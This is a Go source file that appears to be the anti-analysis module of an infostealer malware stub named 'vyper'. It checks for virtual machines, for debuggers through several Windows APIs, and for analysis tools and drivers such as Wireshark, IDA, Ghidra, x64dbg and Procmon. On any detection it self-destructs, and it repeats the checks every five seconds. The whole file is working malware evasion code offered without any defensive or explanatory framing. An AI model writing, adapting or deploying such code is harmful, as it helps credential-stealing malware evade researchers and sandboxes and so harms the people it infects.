//go:build windows

package antianalysis

import (
	"strings"
	"time"
	"unsafe"

	"vyper/Stub/infostealer"

	"golang.org/x/sys/windows"

	"github.com/klauspost/cpuid/v2"
)

const (
	ProcessDebugPort         = 7
	ProcessDebugObjectHandle = 30
	ProcessDebugFlags        = 31
)

var (
	kernel32                    = windows.NewLazySystemDLL("kernel32.dll")
	isDebuggerPresent           = kernel32.NewProc("IsDebuggerPresent")
	getTickCount64              = kernel32.NewProc("GetTickCount64")
	psapi                       = windows.NewLazySystemDLL("psapi.dll")
	procEnumDeviceDrivers       = psapi.NewProc("EnumDeviceDrivers")
	procGetDeviceDriverBaseName = psapi.NewProc("GetDeviceDriverBaseNameW")
	debuggerprocnames           = []string{
		"wireshark.exe", "x64dbg.exe", "x32dbg", "ollydbg.exe", "windbg.exe",
		"ida.exe", "ida64.exe", "ghidra.exe", "ghidra_run.bat",
		"immunitydebugger.exe", "ProcessHacker.exe", "SystemInformer.exe",
		"procexp.exe", "procmon.exe", "procmon64.exe", "Scylla.exe",
		"Cheat Engine.exe", "Fiddler.exe", "HTTPDebuggerUI.exe", "Tcpview.exe",
	}
	debuggerdrivernames = []string{
		"SystemInformer.sys", "KProcessHacker.sys", "PROCMON24.SYS",
		"npf.sys", "npcapp.sys", "PROCEXP152.SYS", "WdbgExts.sys",
		"dbk64.sys", "HookLibrary.sys",
	}
)

func isDriverLoaded(driverName string) bool {
	var bytesNeeded uint32
	procEnumDeviceDrivers.Call(0, 0, uintptr(unsafe.Pointer(&bytesNeeded)))

	drivers := make([]uintptr, bytesNeeded/uint32(unsafe.Sizeof(uintptr(0))))

	driverreturn, _, _ := procEnumDeviceDrivers.Call(
		uintptr(unsafe.Pointer(&drivers[0])),
		uintptr(bytesNeeded),
		uintptr(unsafe.Pointer(&bytesNeeded)),
	)

	if driverreturn == 0 {
		return false
	}

	for _, baseAddr := range drivers {
		if baseAddr == 0 {
			continue
		}

		tempBuf := make([]uint16, 256)
		driverreturn, _, _ := procGetDeviceDriverBaseName.Call(
			baseAddr,
			uintptr(unsafe.Pointer(&tempBuf[0])),
			uintptr(len(tempBuf)),
		)

		if driverreturn > 0 {
			name := windows.UTF16ToString(tempBuf)
			if strings.EqualFold(name, driverName) {
				return true
			}
		}
	}
	return false
}

func AntiAnalysis() {
	handle := windows.CurrentProcess()

	if cpuid.CPU.VM() {
		brand := strings.ToLower(cpuid.CPU.BrandName)
		vmVendors := []string{"vmware", "virtualbox", "vbox", "qemu", "xen"}
		for _, vendor := range vmVendors {
			if strings.Contains(brand, vendor) {
				SelfDestruct()
			}
		}
	}

	for true {
		debuggerpresent, _, _ := isDebuggerPresent.Call()
		if debuggerpresent != 0 {
			SelfDestruct()
		}
		var debugPort uintptr
		err := windows.NtQueryInformationProcess(
			handle,
			ProcessDebugPort,
			unsafe.Pointer(&debugPort),
			uint32(unsafe.Sizeof(debugPort)),
			nil,
		)
		if err == nil && debugPort != 0 {
			SelfDestruct()
		}
		var debugObject windows.Handle
		err = windows.NtQueryInformationProcess(
			handle,
			ProcessDebugObjectHandle,
			unsafe.Pointer(&debugObject),
			uint32(unsafe.Sizeof(debugObject)),
			nil,
		)
		if err == nil && debugObject != 0 {
			SelfDestruct()
		}
		var debugFlags uint32
		err = windows.NtQueryInformationProcess(
			handle,
			ProcessDebugFlags,
			unsafe.Pointer(&debugFlags),
			uint32(unsafe.Sizeof(debugFlags)),
			nil,
		)
		if err == nil && debugFlags == 8 {
			SelfDestruct()
		}

		for _, procname := range debuggerprocnames {
			isHere := infostealer.FindProcess(procname)
			if isHere != 0 {
				SelfDestruct()
			}
		}

		for _, drvname := range debuggerdrivernames {
			isHere := isDriverLoaded(drvname)
			if isHere {
				SelfDestruct()
			}
		}

		time.Sleep(5 * time.Second)
	}
}
